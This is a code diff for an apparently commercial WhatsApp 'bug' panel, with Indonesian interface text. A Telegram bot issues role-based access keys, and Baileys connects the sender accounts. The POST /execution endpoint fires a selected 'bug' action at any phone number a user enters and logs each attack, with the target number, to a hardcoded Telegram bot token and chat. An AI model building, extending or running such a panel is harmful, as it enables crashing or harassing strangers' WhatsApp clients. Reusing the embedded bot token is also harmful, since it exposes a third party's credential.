+        if (selectedOption === ckeyPollData.users.length) {
+          await ctx.telegram.sendMessage(ckeyPollData.adminId, "❌ <b>Penghapusan dibatalkan</b>", {
+            parse_mode: "HTML"
+          });
+        } else {
+          const selectedIndex = selectedOption;
+          if (selectedIndex >= 0 && selectedIndex < ckeyPollData.users.length) {
+            const userToDelete = ckeyPollData.users[selectedIndex];
+            const newUsersList = ckeyPollData.users.filter((user, index) => index !== selectedIndex);
+            saveUsers(newUsersList);
+            await ctx.telegram.sendMessage(ckeyPollData.adminId, "✅ <b>User berhasil dihapus</b>\n\n" + ("<b>Username:</b> <code>" + userToDelete.username + "</code>\n") + ("<b>Role:</b> " + (userToDelete.role || "user") + "\n") + "<i>Key user telah dihapus dari sistem</i>", {
+              parse_mode: "HTML"
+            });
+          }
+        }
+        ckeyPolls.delete(pollId);
+        return;
+      }
+      if (ckeyPollData.type === "ckey") {
+        let role = "";
+        let roleDisplay = "";
+        switch (selectedOption) {
+          case 0:
+            role = "owner";
+            roleDisplay = "👑 Owner";
+            break;
+          case 1:
+            role = "admin";
+            roleDisplay = "🔧 Admin";
+            break;
+          case 2:
+            role = "user";
+            roleDisplay = "👤 User";
+            break;
+          case 3:
+            ckeyPolls.delete(pollId);
+            await ctx.telegram.sendMessage(ckeyPollData.adminId, "❌ <b>Pembuatan key dibatalkan</b>", {
+              parse_mode: "HTML"
+            });
+            return;
+        }
+        const users = getUsers();
+        const existingUserIndex = users.findIndex(user => user.username === ckeyPollData.username);
+        const expiredDate = new Date(ckeyPollData.expired).toLocaleString("id-ID", {
+          year: "numeric",
+          month: "2-digit",
+          day: "2-digit",
+          hour: "2-digit",
+          minute: "2-digit",
+          timeZone: "Asia/Jakarta"
+        });
+        if (existingUserIndex !== -1) {
+          users[existingUserIndex] = {
+            ...users[existingUserIndex],
+            key: ckeyPollData.key,
+            expired: ckeyPollData.expired,
+            role: role,
+            telegram_id: ckeyPollData.telegramId,
+            updated_at: Date.now()
+          };
+        } else {
+          users.push({
+            username: ckeyPollData.username,
+            key: ckeyPollData.key,
+            expired: ckeyPollData.expired,
+            role: role,
+            telegram_id: ckeyPollData.telegramId,
+            isLoggedIn: false,
+            created_at: Date.now(),
+            created_by: ckeyPollData.adminId
+          });
+        }
+        const saveResult = saveUsers(users);
+        if (!saveResult) {
+          await ctx.telegram.sendMessage(ckeyPollData.adminId, "❌ <b>Gagal menyimpan data user!</b>", {
+            parse_mode: "HTML"
+          });
+          ckeyPolls.delete(pollId);
+          return;
+        }
+        try {
+          await ctx.telegram.sendChatAction(ckeyPollData.telegramId, "typing");
+          const userMessage = "🔐 <b>AKUN BARU TELAH DIBUAT</b>\n\n" + ("<b>Username:</b> <code>" + ckeyPollData.username + "</code>\n") + ("<b>Password:</b> <code>" + ckeyPollData.key + "</code>\n") + ("<b>Role:</b> " + roleDisplay + "\n") + ("<b>Expired:</b> " + expiredDate + " WIB\n\n") + "<b>Login via:</b>\n" + ("• Web: " + ipvps + ":" + port + "\n") + ("• Bot: @" + ctx.botInfo.username + "\n\n") + "<i>Simpan data ini dengan aman!</i>";
+          await ctx.telegram.sendMessage(ckeyPollData.telegramId, userMessage, {
+            parse_mode: "HTML"
+          });
+          await ctx.telegram.sendMessage(ckeyPollData.adminId, "✅ <b>Key berhasil dibuat dan dikirim ke user!</b>\n\n" + ("<b>Username:</b> <code>" + ckeyPollData.username + "</code>\n") + ("<b>Role:</b> " + roleDisplay + "\n") + ("<b>Telegram ID:</b> <code>" + ckeyPollData.telegramId + "</code>\n\n") + "<i>Data telah dikirim ke chat pribadi user</i>", {
+            parse_mode: "HTML"
+          });
+        } catch (error) {
+          let errorMessage = "";
+          if (error.code === 403) {
+            errorMessage = "⚠️ <b>Gagal mengirim data ke user!</b>\n\n" + ("User dengan ID <code>" + ckeyPollData.telegramId + "</code> belum memulai bot.\n") + ("Minta user untuk ketik /start di bot @" + ctx.botInfo.username + " terlebih dahulu.\n\n") + "<b>Data untuk dikirim manual:</b>\n" + ("Username: " + ckeyPollData.username + "\n") + ("Key: " + ckeyPollData.key + "\n") + ("Role: " + role + "\n") + ("Expired: " + expiredDate);
+          } else if (error.code === 400) {
+            errorMessage = "❌ <b>Telegram ID tidak valid!</b>\n\n" + ("ID <code>" + ckeyPollData.telegramId + "</code> tidak ditemukan.\n") + "Pastikan user sudah mengaktifkan bot atau ID benar.";
+          } else {
+            errorMessage = "❌ <b>Error mengirim ke user:</b> " + error.message + "\n\n<b>Silakan kirim data secara manual ke user:</b>\n\n" + ("<code>Username: " + ckeyPollData.username + "</code>\n") + ("<code>Key: " + ckeyPollData.key + "</code>\n") + ("<code>Role: " + role + "</code>\n") + ("<code>Login: https://" + ipvps + ":" + port + "</code>");
+          }
+          await ctx.telegram.sendMessage(ckeyPollData.adminId, errorMessage, {
+            parse_mode: "HTML"
+          });
+        }
+        ckeyPolls.delete(pollId);
+        return;
+      }
+    }
+  } catch (error) {
+    console.error("Error in poll_answer handler:", error);
+  }
+});
+
+bot.command("sessions", async ctx => {
+  const allSessions = loadUserSessions();
+  const activeCount = activeConnections.size;
+  let message = "<blockquote>📊 Session Status</blockquote>\n\n";
+  message += "<b>Active Sessions:</b> " + activeCount + "\n";
+  message += "<b>Registered Users:</b> " + Object.keys(allSessions).length + "\n\n";
+  if (Object.keys(allSessions).length > 0) {
+    message += "<b>User Details:</b>\n";
+    Object.entries(allSessions).forEach(([username, numbers], index) => {
+      message += "\n<b>" + (index + 1) + ". " + username + ":</b> " + numbers.length + " sender(s)\n";
+      numbers.forEach(number => {
+        const isActive = activeConnections.has(number);
+        message += "   - " + number + " " + (isActive ? "✅" : "❌") + "\n";
+      });
+    });
+  } else {
+    message += "<i>Tidak ada session terdaftar</i>";
+  }
+  const keyboard = Markup.inlineKeyboard([[Markup.button.callback("🔄 Refresh", "session_status")], [Markup.button.callback("🏠 Main Menu", "back_to_main")]]);
+  const replyOptions = {
+    parse_mode: "HTML",
+    reply_markup: keyboard.reply_markup
+  };
+  await ctx.reply(message, replyOptions);
+});
+
+bot.command("myrole", async ctx => {
+  const userId = ctx.from.id.toString();
+  const userName = ctx.from.username || ctx.from.first_name || "User";
+  let role = "User";
+  if (isOwner(userId)) {
+    role = "Owner";
+  } else if (isAuthorized(userId) && !isOwner(userId)) {
+    role = "Admin";
+  }
+  const keyboard = Markup.inlineKeyboard([[Markup.button.callback("🔑 Buat Key", "quick_listkey")], [Markup.button.callback("📋 List Keys", "quick_listkey")], [Markup.button.callback("🏠 Main Menu", "back_to_main")]]);
+  await ctx.reply("\n👤 <b>Role Information</b>\n\n🆔 <b>User:</b> " + userName + "\n🎭 <b>Bot Role:</b> " + role + "\n💻 <b>User ID:</b> <code>" + userId + "</code>\n\n" + (role === "Owner" ? "🔓 <i>Anda memiliki akses penuh ke semua fitur</i>" : role === "Admin" ? "🔐 <i>Anda memiliki akses terbatas</i>" : "🔒 <i>Akses terbatas untuk user biasa</i>") + "\n  ", {
+    parse_mode: "HTML",
+    reply_markup: keyboard.reply_markup
+  });
+});
+
+bot.command("pending", async ctx => {
+  const userId = ctx.from.id.toString();
+  if (!isOwner(userId)) {
+    return ctx.reply("🚫 Akses ditolak.");
+  }
+  const pendingCount = ckeyPolls.size;
+  let message = "📊 <b>Pending Operations</b>\n\n";
+  message += "Total pending: " + pendingCount + "\n\n";
+  if (pendingCount > 0) {
+    ckeyPolls.forEach((pollData, pollId) => {
+      message += "• Poll ID: " + pollId.substring(0, 8) + "...\n";
+      message += "  Type: " + (pollData.type || "ckey") + "\n";
+      message += "  User: " + (pollData.username || "N/A") + "\n";
+      message += "  Time: " + new Date(pollData.timestamp).toLocaleTimeString("id-ID") + "\n\n";
+    });
+  } else {
+    message += "✅ Tidak ada operasi pending.";
+  }
+  await ctx.reply(message, {
+    parse_mode: "HTML"
+  });
+});
+
+bot.command("cleanup", async ctx => {
+  const userId = ctx.from.id.toString();
+  if (!isOwner(userId)) {
+    return ctx.reply("🚫 Akses ditolak.");
+  }
+  const now = Date.now();
+  let cleaned = 0;
+  ckeyPolls.forEach((pollData, pollId) => {
+    if (now - pollData.timestamp > 600000) {
+      ckeyPolls.delete(pollId);
+      cleaned++;
+    }
+  });
+  await ctx.reply("✅ Cleanup selesai. " + cleaned + " pending dihapus.");
+});
+
+bot.command("addowner", ctx => {
+  const userId = ctx.from.id.toString();
+  const targetId = ctx.message.text.split(" ")[1];
+  if (!isOwner(userId)) {
+    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
+  }
+  if (!targetId) {
+    return ctx.reply("✗ Format salah\n\nExample : /addowner 7066156416", {
+      parse_mode: "HTML"
+    });
+  }
+  const accessData = loadAkses();
+  if (accessData.owners.includes(targetId)) {
+    return ctx.reply("✗ Already an owner.");
+  }
+  accessData.owners.push(targetId);
+  saveAkses(accessData);
+  ctx.reply("✓ New owner added: " + targetId);
+});
+
+bot.command("delowner", ctx => {
+  const userId = ctx.from.id.toString();
+  const targetId = ctx.message.text.split(" ")[1];
+  if (!isOwner(userId)) {
+    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
+  }
+  if (!targetId) {
+    return ctx.reply("✗ Format salah\n\nExample : /delowner 7066156416", {
+      parse_mode: "HTML"
+    });
+  }
+  const accessData = loadAkses();
+  if (!accessData.owners.includes(targetId)) {
+    return ctx.reply("✗ Not the owner.");
+  }
+  accessData.owners = accessData.owners.filter(id => id !== targetId);
+  saveAkses(accessData);
+  ctx.reply("✓ Owner ID " + targetId + " was successfully deleted.");
+});
+
+const { 
+  generateForwardMessageContent, 
+  prepareWAMessageMedia, 
+  generateWAMessageFromContent, 
+  generateMessageTag, 
+  generateMessageID, 
+  downloadContentFromMessage, 
+  makeInMemoryStore, 
+  getContentType, 
+  jidDecode, 
+  MessageRetryMap, 
+  getAggregateVotesInPollMessage, 
+  proto 
+} = require("@whiskeysockets/baileys");
+
+const { actions } = require("./database/func-config.js");
+
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.urlencoded({ extended: true }));
+app.use(cookieParser());
+app.use(express.json());
+app.use(express.static("public"));
+app.use("/", tools);
+app.use((req, res, next) => {
+  if (!req.path.match(/\.(css|js|jpg|png|gif|ico|svg|mp3|mp4)$/)) {
+    res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, private");
+    res.setHeader("Pragma", "no-cache");
+    res.setHeader("Expires", "0");
+    res.setHeader("X-Content-Type-Options", "nosniff");
+  }
+  next();
+});
+
+const { requireAuth } = require("./auth.middleware.js");
+
+app.get("/", (req, res) => {
+  const sessionUser = req.cookies.sessionUser;
+  const sessionId = req.cookies.sessionId;
+  const sessionData = activeSessions.get(sessionUser);
+  const isValidSession = sessionData && sessionData.sessionId === sessionId;
+  if (sessionUser && isValidSession) {
+    const users = getUsers();
+    const user = users.find(u => u.username === sessionUser);
+    if (user && Date.now() < user.expired) {
+      return res.redirect("/dashboard");
+    }
+  }
+  const loginPath = path.join(__dirname, "!─☇𝐒𝐢𝐗", "Login.html");
+  fs.readFile(loginPath, "utf8", (err, data) => {
+    if (err) {
+      return res.status(500).send("✗ Gagal baca Login.html");
+    }
+    res.send(data);
+  });
+});
+
+app.get("/login", (req, res) => {
+  const sessionUser = req.cookies.sessionUser;
+  const sessionId = req.cookies.sessionId;
+  const sessionData = activeSessions.get(sessionUser);
+  const isValidSession = sessionData && sessionData.sessionId === sessionId;
+  if (sessionUser && isValidSession) {
+    const users = getUsers();
+    const user = users.find(u => u.username === sessionUser);
+    if (user && Date.now() < user.expired) {
+      return res.redirect("/dashboard");
+    }
+  }
+  const loginPath = path.join(__dirname, "!─☇𝐒𝐢𝐗", "Login.html");
+  fs.readFile(loginPath, "utf8", (err, data) => {
+    if (err) {
+      return res.status(500).send("✗ Gagal baca Login.html");
+    }
+    res.send(data);
+  });
+});
+
+app.post("/auth", (req, res) => {
+  const { username, key, remember } = req.body;
+  const users = getUsers();
+  const user = users.find(u => u.username === username && u.key === key);
+  if (!user) {
+    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
+  }
+  if (Date.now() > user.expired) {
+    return res.redirect("/login?msg=" + encodeURIComponent("Akun telah expired!"));
+  }
+  if (activeSessions.has(username)) {
+    return res.redirect("/login?msg=" + encodeURIComponent("Akun sudah login di device lain!"));
+  }
+  const sessionId = generateSessionId();
+  const sessionDuration = remember === "true" ? 2592000000 : 86400000;
+  const userData = {
+    username: user.username,
+    role: user.role,
+    expired: user.expired
+  };
+  const sessionData = {
+    sessionId: sessionId,
+    loginTime: Date.now(),
+    userAgent: req.headers["user-agent"],
+    expiresAt: Date.now() + sessionDuration,
+    remember: remember === "true",
+    userData: userData
+  };
+  activeSessions.set(username, sessionData);
+  savePersistentSessions();
+  const cookieOptions = {
+    maxAge: sessionDuration,
+    httpOnly: true,
+    path: "/"
+  };
+  const finalCookieOptions = cookieOptions;
+  res.cookie("sessionUser", username, finalCookieOptions);
+  res.cookie("sessionId", sessionId, finalCookieOptions);
+  res.redirect("/dashboard");
+});
+
+app.get("/dashboard", requireAuth, (req, res) => {
+  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, private");
+  res.setHeader("Pragma", "no-cache");
+  res.setHeader("Expires", "0");
+  const now = Date.now();
+  const dashboardPath = path.join(__dirname, "!─☇𝐒𝐢𝐗", "dashboard.html");
+  fs.readFile(dashboardPath, "utf8", (err, data) => {
+    if (err) {
+      console.error("❌ Gagal membaca file dashboard.html:", err);
+      return res.status(500).send("File dashboard tidak ditemukan");
+    }
+    const sessionScript = `
+        <script>
+            setInterval(() => {
+                fetch('/api/session-check', {
+                    credentials: 'include'
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        window.location.href = '/logout?reason=session_expired';
+                    }
+                })
+                .catch(() => {
+                    window.location.href = '/logout?reason=network_error';
+                });
+            }, 30000);
+            
+            history.pushState(null, null, location.href);
+            window.onpopstate = function () {
+                history.go(1);
+            };
+        </script>
+        `;
+    const finalHtml = data.replace("</body>", sessionScript + "</body>");
+    res.send(finalHtml);
+  });
+});
+
+app.get("/api/option-data", requireAuth, (req, res) => {
+  try {
+    const sessionUser = req.cookies.sessionUser;
+    const sessionId = req.cookies.sessionId;
+    const sessionData = activeSessions.get(sessionUser);
+    const isValidSession = sessionData && sessionData.sessionId === sessionId;
+    if (!isValidSession) {
+      return res.status(401).json({
+        error: "Session invalid",
+        redirect: "/login"
+      });
+    }
+    const users = getUsers();
+    const user = users.find(u => u.username === sessionUser);
+    if (!user) {
+      return res.status(404).json({
+        error: "User not found",
+        redirect: "/login"
+      });
+    }
+    const now = Date.now();
+    if (now > user.expired) {
+      return res.status(403).json({
+        error: "Account expired",
+        redirect: "/login?msg=Account+expired"
+      });
+    }
+    const allSessions = loadUserSessions();
+    const userSenders = allSessions[sessionUser] || [];
+    const activeSenders = userSenders.filter(num => activeConnections.has(num));
+    let expiredDisplay;
+    if (user.expired === "Permanent" || user.expired > now + 315360000000) {
+      expiredDisplay = "Permanent";
+    } else {
+      expiredDisplay = new Date(user.expired).toLocaleString("id-ID", {
+        timeZone: "Asia/Jakarta",
+        year: "numeric",
+        month: "2-digit",
+        day: "2-digit",
+        hour: "2-digit",
+        minute: "2-digit"
+      });
+    }
+    const timeRemaining = user.expired - now;
+    const daysRemaining = Math.max(0, Math.floor(timeRemaining / 86400000));
+    let onlineUsers = activeSessions.size;
+    if (sessionData) {
+      sessionData.lastActive = now;
+      savePersistentSessions();
+    }
+    const responseData = {
+      username: user.username,
+      role: user.role || "user",
+      activeSenders: activeSenders.length,
+      totalSenders: userSenders.length,
+      expired: expiredDisplay,
+      daysRemaining: daysRemaining,
+      isPermanent: user.expired === "Permanent" || user.expired > now + 315360000000,
+      onlineUsers: onlineUsers || 1,
+      sessionValid: true,
+      timestamp: now,
+      accountStatus: timeRemaining > 0 ? "active" : "expired"
+    };
+    res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, private");
+    res.setHeader("Pragma", "no-cache");
+    res.setHeader("Expires", "0");
+    res.setHeader("X-Content-Type-Options", "nosniff");
+    res.json(responseData);
+  } catch (error) {
+    console.error("[API] Error in /api/option-data:", error);
+    res.status(500).json({
+      error: "Internal server error",
+      timestamp: Date.now()
+    });
+  }
+});
+
+// =========== TAMBAHKAN ENDPOINT INI ===========
+app.get("/api/bug-options", requireAuth, (req, res) => {
+  try {
+    // Coba ambil dari func-config.js
+    const { actions } = require("./database/func-config.js");
+    
+    const bugOptions = Object.entries(actions).map(([key, action]) => ({
+      value: key,
+      name: action.name || key,
+      icon: action.icon || "fa-solid fa-bug"
+    }));
+    
+    res.json(bugOptions);
+  } catch (error) {
+    console.error("Error loading bug options:", error);
+    // Fallback ke default options
+  }
+});
+// =========== END TAMBAHKAN ENDPOINT ===========
+
+app.get("/api/reload-sessions", requireAuth, async (req, res) => {
+  try {
+    const sessionUser = req.cookies.sessionUser;
+    console.log(chalk.blue.bold("[API] Manual reload requested by " + sessionUser));
+    reloadAllSessions();
+    res.json({
+      success: true,
+      message: "Session reload initiated",
+      timestamp: Date.now()
+    });
+  } catch (error) {
+    console.error("[API] Reload sessions error:", error);
+    res.status(500).json({
+      success: false,
+      error: "Failed to reload sessions"
+    });
+  }
+});
+
+app.get("/api/profile-data", requireAuth, (req, res) => {
+  const sessionUser = req.cookies.sessionUser;
+  const users = getUsers();
+  const user = users.find(u => u.username === sessionUser);
+  if (!user) {
+    return res.status(404).json({
+      error: "User not found"
+    });
+  }
+  const expiredDate = new Date(user.expired).toLocaleString("id-ID", {
+    timeZone: "Asia/Jakarta",
+    year: "numeric",
+    month: "2-digit",
+    day: "2-digit",
+    hour: "2-digit",
+    minute: "2-digit"
+  });
+  const now = Date.now();
+  const timeRemaining = user.expired - now;
+  const daysRemaining = Math.max(0, Math.floor(timeRemaining / 86400000));
+  res.json({
+    username: user.username,
+    role: user.role || "user",
+    key: user.key || "",
+    activeSenders: activeConnections.size,
+    expired: expiredDate,
+    daysRemaining: daysRemaining,
+    createdAt: user.createdAt || Date.now(),
+    telegram_id: user.telegram_id || "",
+    status: Date.now() > user.expired ? "expired" : "active"
+  });
+});
+
+app.get("/api/user-stats", requireAuth, (req, res) => {
+  const sessionUser = req.cookies.sessionUser;
+  const allSessions = loadUserSessions();
+  const userSenders = allSessions[sessionUser] || [];
+  const formattedSenders = userSenders.map(number => ({
+    number: number,
+    country: getCountryCode(number),
+    formatted: formatPhoneNumber(number)
+  }));
+  const responseData = {
+    stats: formattedSenders
+  };
+  res.json(responseData);
+});
+
+app.get("/api/online-users", requireAuth, (req, res) => {
+  const onlineCount = activeSessions.size;
+  res.json({
+    onlineUsers: onlineCount || 1,
+    timestamp: Date.now()
+  });
+});
+
+const telegramBotToken = "8599230972:AAGKFgK7Xw8_vx9IAoBOmZnj2zwAXydH1Rc";
+const telegramChatId = "8270020269";
+let lastExecuted = 0;
+
+app.get("/execution", async (req, res) => {
+  try {
+    const sessionUser = req.cookies.sessionUser;
+    if (!sessionUser) {
+      return res.redirect("/login?msg=Silakan login terlebih dahulu");
+    }
+    const users = getUsers();
+    const user = users.find(u => u.username === sessionUser);
+    if (!user || !user.expired || Date.now() > user.expired) {
+      return res.redirect("/login?msg=Session expired, login ulang");
+    }
+    const justExecuted = req.query.justExecuted === "true";
+    const target = req.query.target || "";
+    const mode = req.query.mode || "";
+    if (justExecuted && target && mode) {
+      const cleanTarget = target.replace(/\D/g, "");
+      const country = getCountryCode(cleanTarget);
+      return res.send(generateExecutionPage("✓ S U C C E S", {
+        target: target,
+        timestamp: new Date().toLocaleString("id-ID"),
+        message: "𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: " + mode.toUpperCase() + " - Completed - " + country
+      }, false, user, "", mode));
+    }
+    const allSessions = loadUserSessions();
+    const userSenders = allSessions[sessionUser] || [];
+    const activeSenders = userSenders.filter(num => activeConnections.has(num));
+    return res.send(generateExecutionPage("🟥 Ready", {
+      message: "Masukkan nomor target dan pilih mode bug",
+      activeSenders: activeSenders
+    }, true, user, "", mode));
+  } catch (error) {
+    console.error("❌ Fatal error di /execution:", error);
+    return res.status(500).send("Internal Server Error");
+  }
+});
+
+app.post("/execution", requireAuth, async (req, res) => {
+  try {
+    const sessionUser = req.cookies.sessionUser;
+    const { target, mode } = req.body;
+    if (!target || !mode) {
+      return res.status(400).json({
+        success: false,
+        error: "⚠️ Target dan mode harus diisi"
+      });
+    }
+    const validationResult = validatePhoneNumber(target);
+    if (!validationResult.isValid) {
+      const errorResponse = {
+        success: false,
+        error: "❌ " + validationResult.message
+      };
+      return res.status(400).json(errorResponse);
+    }
+    const cleanNumber = validationResult.cleanNumber;
+    const country = validationResult.country || getCountryCode(cleanNumber);
+    if (cleanNumber.length < 7 || cleanNumber.length > 17) {
+      return res.status(400).json({
+        success: false,
+        error: "❌ Panjang nomor harus 7-17 digit"
+      });
+    }
+    const allSessions = loadUserSessions();
+    const userSenders = allSessions[sessionUser] || [];
+    const activeSenders = userSenders.filter(num => activeConnections.has(num));
+    if (activeSenders.length === 0) {
+      return res.status(400).json({
+        success: false,
+        error: "📵 Tidak ada sender aktif. Silakan tambahkan sender terlebih dahulu."
+      });
+    }
+    const availableModes = Object.keys(actions);
+    if (!availableModes.includes(mode)) {
+      return res.status(400).json({
+        success: false,
+        error: "⚙️ Mode '" + mode + "' tidak valid. Pilih: " + availableModes.join(", ")
+      });
+    }
+    const firstActiveSender = activeSenders[0];
+    const sock = activeConnections.get(firstActiveSender);
+    if (!sock) {
+      return res.status(400).json({
+        success: false,
+        error: "🔌 Sender tidak aktif. Periksa koneksi sender."
+      });
+    }
+    const targetJid = cleanNumber + "@s.whatsapp.net";
+    let result;
+    let bugName = "";
+    try {
+      console.log(chalk.green.bold("\n[TR4SH CORE] 🚀 User: " + sessionUser + "\nMode: " + mode + "\nTarget: " + cleanNumber + " (" + country + ")\n"));
+      const action = actions[mode];
+      if (action) {
+        bugName = action.name;
+        result = await action.execute(sock, targetJid);
+      } else {
+        throw new Error("Action " + mode + " not found");
+      }
+      const telegramMessage = "\n<blockquote>⚡ <b>NEW EXECUTION - " + country.toUpperCase() + "</b></blockquote>\n\n👤 <b>User:</b> <code>" + sessionUser + "</code>\n📞 <b>Sender:</b> <code>" + firstActiveSender + "</code>\n🎯 <b>Target:</b> <code>" + cleanNumber + "</code> (" + country + ")\n📱 <b>Mode:</b> " + bugName + "\n🔢 <b>Country Code:</b> " + cleanNumber.substring(0, 3) + "...\n⏰ <b>Time:</b> " + new Date().toLocaleString("id-ID", {
+        timeZone: "Asia/Jakarta"
+      }) + "\n✅ <b>Status:</b> SUCCESS - Sent to server\n\n<i>Powered by Interclose • Phone Helper Detection</i>";
+      const telegramData = {
+        chat_id: telegramChatId,
+        text: telegramMessage,
+        parse_mode: "HTML"
+      };
+      axios.post("https://api.telegram.org/bot" + telegramBotToken + "/sendMessage", telegramData).catch(err => console.error("❌ Gagal kirim log Telegram:", err.message));
+      lastExecuted = Date.now();
+      res.json({
+        success: true,
+        message: "✅ Bug berhasil dikirim ke " + cleanNumber,
+        details: {
+          target: cleanNumber,
+          mode: mode,
+          bugName: bugName,
+          country: country,
+          sender: firstActiveSender,
+          timestamp: Date.now(),
+          formattedTarget: "+" + cleanNumber
+        }
+      });
+    } catch (error) {
+      console.error("[EXECUTION ERROR] User: " + sessionUser + " | Error:", error.message);
+      const errorMessage = "\n<blockquote>❌ <b>EXECUTION FAILED</b></blockquote>\n\n👤 <b>User:</b> <code>" + sessionUser + "</code>\n🎯 <b>Target:</b> <code>" + cleanNumber + "</code> (" + country + ")\n📱 <b>Mode:</b> " + bugName + "\n⚠️ <b>Error:</b> <code>" + error.message + "</code>\n⏰ <b>Time:</b> " + new Date().toLocaleString("id-ID");
+      const telegramErrorData = {
+        chat_id: telegramChatId,
+        text: errorMessage,
+        parse_mode: "HTML"
+      };
+      axios.post("https://api.telegram.org/bot" + telegramBotToken + "/sendMessage", telegramErrorData).catch(err => console.error("❌ Gagal kirim error log Telegram:", err.message));
+      const errorResponse = {
+        success: false,
+        error: "💥 Gagal mengeksekusi bug: " + error.message,
+        suggestion: "Cek koneksi sender atau coba beberapa menit lagi"
+      };
+      res.status(500).json(errorResponse);
+    }
+  } catch (error) {
+    console.error("❌ FATAL Error in POST /execution:", error);
+    const fatalMessage = "\n<blockquote>💀 <b>FATAL EXECUTION ERROR</b></blockquote>\n\n⚠️ <b>Error:</b> <code>" + error.message + "</code>\n📋 <b>Stack:</b> <code>" + error.stack?.substring(0, 200) + "...</code>\n⏰ <b>Time:</b> " + new Date().toLocaleString("id-ID");
+    const telegramFatalData = {
+      chat_id: telegramChatId,
+      text: fatalMessage,
+      parse_mode: "HTML"
+    };
+    axios.post("https://api.telegram.org/bot" + telegramBotToken + "/sendMessage", telegramFatalData).catch(err => console.error("❌ Gagal kirim fatal log Telegram:", err.message));
+    res.status(500).json({
+      success: false,
+      error: "🔥 Terjadi kesalahan internal server",
+      details: "Tim developer telah diberitahu"
+    });
+  }
+});
+
+app.get("/my-senders", requireAuth, (req, res) => {
+  const senderPath = path.join(__dirname, "!─☇𝐒𝐢𝐗", "sender.html");
+  fs.readFile(senderPath, "utf8", (err, data) => {
+    if (err) {
+      console.error("❌ Gagal membaca file sender.html:", err);
+      return res.status(500).send("File sender.html tidak ditemukan");
+    }
+    res.send(data);
+  });
+});
+
+app.get("/api/my-senders", requireAuth, (req, res) => {
+  const sessionUser = req.cookies.sessionUser;
+  const allSessions = loadUserSessions();
+  const userSenders = allSessions[sessionUser] || [];
+  const response = {
+    success: true,
+    senders: userSenders,
+    total: userSenders.length
+  };
+  res.json(response);
+});
+
+app.get("/api/events", requireAuth, (req, res) => {
+  const sessionUser = req.cookies.sessionUser;
+  res.writeHead(200, {
+    "Content-Type": "text/event-stream",
+    "Cache-Control": "no-cache",
+    Connection: "keep-alive",
+    "Access-Control-Allow-Origin": "*"
+  });
+  eventStreams.set(sessionUser, res);
+  const heartbeat = setInterval(() => {
+    try {
+      res.write(": heartbeat\n\n");
+    } catch (error) {
+      clearInterval(heartbeat);
+    }
+  }, 30000);
+  req.on("close", () => {
+    clearInterval(heartbeat);
+    eventStreams.delete(sessionUser);
+  });
+  res.write("data: " + JSON.stringify({
+    type: "connected",
+    message: "Event stream connected"
+  }) + "\n\n");
+});
+
+app.post("/api/add-sender", requireAuth, async (req, res) => {
+  const sessionUser = req.cookies.sessionUser;
+  const { number } = req.body;
+  if (!number) {
+    return res.json({
+      success: false,
+      error: "Nomor tidak boleh kosong"
+    });
+  }
+  const cleanNumber = number.replace(/\D/g, "");
+  if (cleanNumber.length < 7) {
+    return res.json({
+      success: false,
+      error: "Nomor terlalu pendek"
+    });
+  }
+  try {
+    const deviceDir = getUserAuthDir(sessionUser, cleanNumber);
+    connectToWhatsAppUser(sessionUser, cleanNumber, deviceDir).then(sock => {}).catch(error => {
+      console.error("[" + sessionUser + "] ❌ Failed to connect sender " + cleanNumber + ":", error.message);
+    });
+    const response = {
+      success: true,
+      message: "Proses koneksi dimulai! Silakan tunggu notifikasi kode pairing.",
+      number: cleanNumber,
+      note: "Kode pairing akan muncul di halaman ini dalam beberapa detik..."
+    };
+    res.json(response);
+  } catch (error) {
+    console.error("[API] Error adding sender for " + sessionUser + ":", error);
+    const errorResponse = {
+      success: false,
+      error: "Terjadi error saat memproses sender: " + error.message
+    };
+    res.json(errorResponse);
+  }
+});
+
+app.post("/api/delete-sender", requireAuth, async (req, res) => {
+  const sessionUser = req.cookies.sessionUser;
+  const { number } = req.body;
+  if (!number) {
+    return res.json({
+      success: false,
+      error: "Nomor tidak boleh kosong"
+    });
+  }
+  try {
+    const allSessions = loadUserSessions();
+    if (allSessions[sessionUser]) {
+      allSessions[sessionUser] = allSessions[sessionUser].filter(num => num !== number);
+      saveUserSessions(allSessions);
+    }
+    const deviceDir = getUserAuthDir(sessionUser, number);
+    if (fs.existsSync(deviceDir)) {
+      fs.rmSync(deviceDir, { recursive: true, force: true });
+    }
+    const response = {
+      success: true,
+      message: "Sender berhasil dihapus",
+      number: number
+    };
+    res.json(response);
+  } catch (error) {
+    const errorResponse = {
+      success: false,
+      error: error.message
+    };
+    res.json(errorResponse);
+  }
+});
+
+app.get("/user-management", requireAuth, (req, res) => {
+  const userManagementPath = path.join(__dirname, "!─☇𝐒𝐢𝐗", "user-management.html");
+  fs.readFile(userManagementPath, "utf8", (err, data) => {
+    if (err) {
+      console.error("❌ Gagal membaca file user-management.html:", err);
+      return res.status(500).send("File tidak ditemukan");
+    }
+    res.send(data);
+  });
+});
+
+app.get("/api/users", requireAuth, (req, res) => {
+  const sessionUser = req.cookies.sessionUser;
+  const users = getUsers();
+  const currentUser = users.find(u => u.username === sessionUser);
+  if (!currentUser) {
+    return res.status(404).json({
+      error: "User not found"
+    });
+  }
+  let visibleUsers = [];
+  if (currentUser.role === "owner") {
+    visibleUsers = users;
+  } else if (currentUser.role === "admin") {
+    visibleUsers = users.filter(user => user.role === "user");
+  } else {
+    return res.status(403).json({
+      error: "Forbidden"
+    });
+  }
+  const sanitizedUsers = visibleUsers.map(user => ({
+    username: user.username,
+    role: user.role,
+    key: currentUser.role === "owner" ? user.key : "********",
+    expired: user.expired,
+    status: Date.now() > user.expired ? "Expired" : "Active"
+  }));
+  const response = {
+    success: true,
+    users: sanitizedUsers
+  };
+  res.json(response);
+});
+
+app.get("/api/user/:username", requireAuth, (req, res) => {
+  const sessionUser = req.cookies.sessionUser;
+  const targetUsername = req.params.username;
+  const users = getUsers();
+  const currentUser = users.find(u => u.username === sessionUser);
+  const targetUser = users.find(u => u.username === targetUsername);
+  if (!currentUser || !targetUser) {
+    return res.json({
+      success: false,
